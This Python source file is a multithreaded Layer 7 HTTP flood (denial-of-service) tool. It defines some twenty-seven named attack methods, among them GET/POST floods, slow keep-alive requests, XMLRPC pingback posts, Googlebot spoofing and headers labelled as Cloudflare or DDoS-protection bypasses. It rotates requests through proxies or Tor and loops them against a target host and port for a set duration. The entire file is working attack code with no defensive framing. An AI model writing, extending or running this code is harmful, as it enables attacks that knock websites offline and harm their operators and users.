import requests
import threading
import time
import random
import string
from typing import List
from random import choice
from typing import Dict
def random_subdomain(domain: str) -> str:
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"http://{sub}.{domain}"

def random_cookie() -> str:
    return f"PHPSESSID={''.join(random.choices(string.ascii_letters + string.digits, k=26))}"

def get_proxy(proxies: Dict[str, List[str]]) -> Dict[str, str]:
    # Flatten all proxies and retain type
    all_types = [ptype for ptype in proxies for _ in proxies[ptype]]
    all_values = sum(proxies.values(), [])

    if not all_values:
        return None

    index = choice(range(len(all_values)))
    ptype = all_types[index]
    ipport = all_values[index]

    proxy_url = f"{ptype}://{ipport}"

    return {
        "http": proxy_url,
        "https": proxy_url
    }

# === Layer 7 Attack Functions ===
def get_request(url, proxies): requests.get(url, proxies=get_proxy(proxies), timeout=5)
def post_request(url, proxies): requests.post(url, data={"flood": "true"}, proxies=get_proxy(proxies), timeout=5)
def ovh_request(url, proxies): requests.get(url, headers={"X-Hex": hex(random.randint(0, 99999))}, proxies=get_proxy(proxies), timeout=5)
def ovh_rhex_request(url, proxies): requests.get(url, headers={"User-Agent": ''.join(random.choices(string.hexdigits, k=32)), "X-HexFlood": ''.join(random.choices(string.hexdigits, k=64))}, proxies=get_proxy(proxies), timeout=5)
def ovh_stomp_request(url, proxies): requests.get(url, headers={"User-Agent": "Mozilla/5.0", "X-Captcha-Bypass": "true", "Referer": url, "Accept": "*/*"}, proxies=get_proxy(proxies), timeout=5)
def stress_request(url, proxies): requests.post(url, data="A" * 2048, proxies=get_proxy(proxies), timeout=5)
def dyn_request(url, proxies): requests.get(random_subdomain(url), proxies=get_proxy(proxies), timeout=5)
def downloader_request(url, proxies): r = requests.get(url, proxies=get_proxy(proxies), stream=True, timeout=5); [chunk for chunk in r.iter_content(chunk_size=1)]
def slow_request(url, proxies): s = requests.Session(); s.get(url, headers={"Connection": "keep-alive"}, proxies=get_proxy(proxies), timeout=5)
def head_request(url, proxies): requests.head(url, proxies=get_proxy(proxies), timeout=5)
def null_request(url, proxies): requests.get(url, headers={"User-Agent": ""}, proxies=get_proxy(proxies), timeout=5)
def cookie_request(url, proxies): requests.get(url, headers={"Cookie": random_cookie()}, proxies=get_proxy(proxies), timeout=5)
def pps_request(url, proxies): requests.get(url, headers={"Connection": "close"}, proxies=get_proxy(proxies), timeout=5)
def even_request(url, proxies): requests.get(url, headers={"X-Even": "1", "X-Special": "Yes"}, proxies=get_proxy(proxies), timeout=5)
def gsb_request(url, proxies): requests.get(url, headers={"User-Agent": "Googlebot"}, proxies=get_proxy(proxies), timeout=5)
def dgb_request(url, proxies): requests.get(url, headers={"X-DDoS-Bypass": "1"}, proxies=get_proxy(proxies), timeout=5)
def avb_request(url, proxies): requests.get(url, headers={"X-ArvanCloud-Bypass": "1"}, proxies=get_proxy(proxies), timeout=5)
def bot_request(url, proxies): requests.get(url, headers={"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}, proxies=get_proxy(proxies), timeout=5)
def apache_request(url, proxies): requests.get(url, headers={"Transfer-Encoding": "chunked"}, proxies=get_proxy(proxies), timeout=5)
def xmlrpc_request(url, proxies): requests.post(url + "/xmlrpc.php", data="<methodCall><methodName>pingback.ping</methodName></methodCall>", headers={"Content-Type": "text/xml"}, proxies=get_proxy(proxies), timeout=5)
def cfb_request(url, proxies): requests.get(url, headers={"CF-Bypass": "1"}, proxies=get_proxy(proxies), timeout=5)
def cfbuam_request(url, proxies): requests.get(url, headers={"User-Agent": "Mozilla/5.0", "Challenge": "Bypassed"}, proxies=get_proxy(proxies), timeout=5)
def bypass_request(url, proxies): requests.get(url, headers={"Bypass": "1"}, proxies=get_proxy(proxies), timeout=5)
def bomb_request(url, proxies): requests.get(url, headers={"User-Agent": "bombardier"}, proxies=get_proxy(proxies), timeout=5)
def killer_request(url, proxies): [requests.get(url, proxies=get_proxy(proxies), timeout=2) for _ in range(5)]
def tor_request(url, proxies): requests.get(url, proxies={"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}, timeout=5)

# === Dispatcher ===
METHODS = {
    "GET": get_request,
    "POST": post_request,
    "OVH": ovh_request,
    "OVH:RHEX": ovh_rhex_request,
    "RHEX": ovh_rhex_request,
    "OVH-STOMP": ovh_stomp_request,
    "STOMP": ovh_stomp_request,
    "STRESS": stress_request,
    "DYN": dyn_request,
    "DOWNLOADER": downloader_request,
    "SLOW": slow_request,
    "HEAD": head_request,
    "NULL": null_request,
    "COOKIE": cookie_request,
    "PPS": pps_request,
    "EVEN": even_request,
    "GSB": gsb_request,
    "DGB": dgb_request,
    "AVB": avb_request,
    "BOT": bot_request,
    "APACHE": apache_request,
    "XMLRPC": xmlrpc_request,
    "CFB": cfb_request,
    "CFBUAM": cfbuam_request,
    "BYPASS": bypass_request,
    "BOMB": bomb_request,
    "KILLER": killer_request,
    "TOR": tor_request,
}

# === Runner ===
def run_layer7_attack(args, proxies: List[str]):
    end_time = time.time() + args.duration
    url = f"http://{args.target}:{args.port}"
    method_key = args.method.upper().replace("-", ":").replace("_", ":")

    method_func = METHODS.get(method_key)
    if not method_func:
        print(f"[!] Invalid L7 method: {args.method}")
        return

    def attack():
        while time.time() < end_time:
            try:
                method_func(url, proxies)
            except Exception:
                continue

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
